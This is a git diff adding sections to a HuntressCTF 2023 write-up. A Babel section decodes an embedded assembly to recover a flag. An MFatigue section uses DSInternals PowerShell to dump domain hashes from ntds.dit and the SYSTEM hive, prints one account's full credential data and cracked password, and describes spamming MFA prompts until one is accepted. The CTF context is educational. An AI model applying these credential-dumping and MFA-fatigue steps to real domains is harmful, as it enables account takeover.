@@ -1,4 +1,4 @@
-Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
+Here are my solutions for the challenges I solved as a part of HuntressCTF 2023. My favorite challenges are denoted by a ⭐
 
 - [[Warmups] F12 (Easy)](#f12)
 - [[Warmups] String Cheese (Easy)](#string-cheese)
@@ -7,7 +7,7 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[Warmups] Chicken Wings (Easy)](#chicken-wings)
 - [[Forensics] Opposable Thumbs (Easy)](#opposable-thumbs)
 - [[Forensics] Dumpster Fire (Easy)](#dumpster-fire)
-- [[Forensics] Wimble (Easy)](#wimble)
+- [[Forensics] Wimble (Easy) ⭐](#wimble)
 - [[Forensics] Traffic (Medium)](#traffic)
 - [[Forensics] Rogue Inbox (Medium)](#rogue-inbox)
 - [[Forensics] Backdoored Splunk (Medium)](#backdoored-splunk)
@@ -15,13 +15,15 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[Forensics] Tragedy (Medium)](#tragedy)
 - [[Forensics] Texas Chainsaw Massacre: Tokyo Drift (Hard)](#texas-chainsaw-massacre-tokyo-drift)
 - [[Malware] HumanTwo (Easy)](#humantwo)
-- [[Malware] BlackCat (Easy)](#blackcat)
+- [[Malware] BlackCat (Easy) ⭐](#blackcat)
 - [[Malware] PHP Stager (Easy)](#php-stager)
 - [[Malware] VeeBeeEee (Easy)](#veebeeeee)
 - [[Malware] OpenDir (Medium)](#opendir)
 - [[Malware] Snake Oil (Medium)](#snake-oil)
 - [[Malware] Operation Eradication (Medium)](#operation-eradication)
 - [[Malware] Speakfriend (Medium)](#speakfriend)
+- [[Malware] Thumb Drive (Medium)](#thumb-drive)
+- [[Malware] Babel (Medium)](#babel)
 - [[Malware] Hot off the Press (Medium)](#hot-off-the-press)
 - [[OSINT] Under The Bridge (Medium)](#under-the-bridge)
 - [[OSINT] Operation Not Found (Medium)](#operation-not-found)
@@ -33,6 +35,7 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[Misc] PRESS PLAY ON TAPE (Easy)](#press-play-on-tape)
 - [[Misc] Welcome to the Park (Easy)](#welcome-to-the-park)
 - [[Misc] Indirect Payload (Medium)](#indirect-payload)
+- [[Misc] MFAtigue (Medium)](#indirect-payload)
 - [[Stego] Land Before Time (Easy)](#land-before-time)
 
 ## F12
@@ -1008,6 +1011,45 @@ This spawned a MessageBox with the flag:
 flag{0af2873a74cfa957ccb90cef814cfe3d}
 ```
 
+## Babel
+This challenge presented source code for a C# application. The program would basically deocde a compiled assembly, load it, and then execute it. 
+
+I wrote an equivalent python script that would just decode the assembly data and print it in hex:
+
+```
+import base64
+
+def decode(t, k):
+    translation_str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    decode_buffer = ""
+    decoded_char = dict(zip(k, translation_str))
+    for char in t:
+        if ('A' <= char <= 'Z') or ('a' <= char <= 'z'):
+            decode_buffer += decoded_char[char]
+        else:
+            decode_buffer += char
+    return decode_buffer
+
+assembly_data = "CvsjeemeeeeXeeee//8e ..."
+decode_lookup = "lQwSYRxgfBHqNucMsVonkpaTiteDhbXzLPyEWImKAdjZFCOvJGrU"
+decoded_bytes = base64.b64decode(decode(assembly_data, decode_lookup))
+print(''.join('{:02x}'.format(x) for x in decoded_bytes))
+```
+
+This decoded to a PE binary. I ran strings on it, and it happened to contain the flag:
+
+```
+...
+XR4NtO
+ZWaC
+M{z)
+flag{b6cfb6656ea0ac92849a06ead582456c}
+H8H%D
+jh%E
+TG[An
+...
+```
+
 ## Hot off the Press
 This challenge downloaded a UHA archive. I had to download a special program just to extract is as 7-Zip doesn't support this archive format. 
 
@@ -1264,6 +1306,139 @@ character 37 of the payload is }
 
 ```
 flag{448c05ab3e3a7d68e3509eb85e87206f}
+```
+
+## MFatigue
+This challenge presents two files, the `ntds.dit` and the `SYSTEM` registry hive. These files are commonly targeted for exfiltration by attackers as, combined, they can provide username and password hashes for an entire domain.
+
+The first step is to extract these hashes, I used a tool called `DSInternals`:
+
+```
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Install-Module -Name DSInternals
+$key = Get-BootKey -SystemHiveFilePath 'C:\temp\SYSTEM'
+Get-ADDBAccount -All -DBPath C:\temp\ntds.dit -BootKey $key
+```
+
+This produced a list of domain users/computers and their respective password hashes. I searched around and found one user, `JILLIAN_DOTSON` who was a member of the Organizational Unit `OU=Azure Admins`. This was the likely target for this challenge:
+
+```
+DistinguishedName: CN=JILLIAN_DOTSON,OU=T2-Accounts,OU=Azure Admins,OU=Admin,DC=huntressctf,DC=local
+Sid: S-1-5-21-4105979022-1081477748-4060121464-1113
+Guid: 5c189421-b7a6-43d3-aab7-3b8266351379
+SamAccountName: JILLIAN_DOTSON
+SamAccountType: User
+UserPrincipalName: JILLIAN_DOTSON@huntressctf.local
+PrimaryGroupId: 513
+SidHistory: 
+Enabled: True
+UserAccountControl: NormalAccount
+SupportedEncryptionTypes: 
+AdminCount: True
+Deleted: False
+LastLogonDate: 
+DisplayName: JILLIAN_DOTSON
+GivenName: 
+Surname: JILLIAN_DOTSON
+Description: Created with secframe.com/badblood.
+ServicePrincipalName: {POP3/FINWCTRX1000000, kafka/WIN-UUTKPJ98ERD}
+SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, 
+DiscretionaryAclProtected, SelfRelative
+Owner: S-1-5-21-4105979022-1081477748-4060121464-512
+Secrets
+  NTHash: 08e75cc7ee80ff06f77c3e54cadab42a
+  LMHash: 
+  NTHashHistory: 
+    Hash 01: 08e75cc7ee80ff06f77c3e54cadab42a
+    Hash 02: 2f5ee1387c6dfb0c135921dfee0a04a1
+  LMHashHistory: 
+    Hash 01: a6a400e8045cf982acca2621b5d69db8
+    Hash 02: ad24efc398c7c92eea67cac35c513034
+  SupplementalCredentials:
+    ClearText: 
+    NTLMStrongHash: 7adb045e268602de23418782d92b45c2
+    Kerberos:
+      Credentials:
+        DES_CBC_MD5
+          Key: 08b35b9d20fbc27c
+      OldCredentials:
+        DES_CBC_MD5
+          Key: ef85619bb3869e3d
+      Salt: HUNTRESSCTF.LOCALJILLIAN_DOTSON
+      Flags: 0
+    KerberosNew:
+      Credentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 4dae9a25539d7e2ac5aca833c2bf8ba765aafaa217b49e81a6a17e89a4cd0542
+          Iterations: 4096
+        AES128_CTS_HMAC_SHA1_96
+          Key: 1d8a901df79ae247dbcdfd43a8921140
+          Iterations: 4096
+        DES_CBC_MD5
+          Key: 08b35b9d20fbc27c
+          Iterations: 4096
+      OldCredentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 0426698dfbd65f6ba9308b16a76dc420cd0272a839c853273575e5a63a889d2d
+          Iterations: 4096
+        AES128_CTS_HMAC_SHA1_96
+          Key: d60054bf89236653318ed16cd99a73f2
+          Iterations: 4096
+        DES_CBC_MD5
+          Key: ef85619bb3869e3d
+          Iterations: 4096
+      OlderCredentials:
+      ServiceCredentials:
+      Salt: HUNTRESSCTF.LOCALJILLIAN_DOTSON
+      DefaultIterationCount: 4096
+      Flags: 0
+    WDigest:
+      Hash 01: b64887fcf8dbe00c58be8c29aa26c5d8
+      Hash 02: 49d32142ccc7093f5e92c9fcbdee438c
+      Hash 03: b64887fcf8dbe00c58be8c29aa26c5d8
+      Hash 04: b64887fcf8dbe00c58be8c29aa26c5d8
+      Hash 05: bff1c68063f15236859fcc0d3f615c9e
+      Hash 06: bff1c68063f15236859fcc0d3f615c9e
+      Hash 07: 44b297565b815900de58e15e6fd5bc11
+      Hash 08: 63562127348d5b193c088e2d9c1a1e8f
+      Hash 09: a5e202d7cf16c06ad8c2f774a7fe91a3
+      Hash 10: 2392a40ea2dd35a7a94973c97c5faa0a
+      Hash 11: 2392a40ea2dd35a7a94973c97c5faa0a
+      Hash 12: 63562127348d5b193c088e2d9c1a1e8f
+      Hash 13: 63562127348d5b193c088e2d9c1a1e8f
+      Hash 14: 5fde84e09a1ec178bbbe5eccf4421014
+      Hash 15: 3b99c8dbbaf50adbb8dd216e2a1b64d8
+      Hash 16: 593f7767385c892f19948838d755df7e
+      Hash 17: 658ca2ff67cdfd97251613f8d34279bf
+      Hash 18: eae2cc9a22cef4d508076b8514502e4f
+      Hash 19: 73b96675099f466adbeaa5451511319b
+      Hash 20: eae2cc9a22cef4d508076b8514502e4f
+      Hash 21: 03a867a4de436a6c766dbe1261a624bd
+      Hash 22: c19601ec3ef2b6fc7d6f63de6866711c
+      Hash 23: 03a867a4de436a6c766dbe1261a624bd
+      Hash 24: 82af100b5912700e336a726f7f24aeb8
+      Hash 25: 189133f2dacbd488cd75a936b2a390e5
+      Hash 26: 06f1130b84bdcd24785b4f7ab7d62732
+      Hash 27: 214e98cadca09cf5b803589093cb0a4f
+      Hash 28: a40bc69c7dd29d6b1a43302077a1606f
+      Hash 29: 214e98cadca09cf5b803589093cb0a4f
+Key Credentials:
+Credential Roaming
+  Created: 
+  Modified: 
+  Credentials: 
+```
+
+I cracked the hash for this account:
+
+```
+08e75cc7ee80ff06f77c3e54cadab42a -> katlyn99
+```
+
+And was therefore able to authenticate as this account in the Azure login page. The user had MFA enabled, but I repeatedly spammed logins until the simulated Azure admin accepted one out of exhaustion, which gave me the flag:
+
+```
+flag{9b896a677de35d7dfa715a05c25ef89e} 
 ```
 
 ## Land Before Time
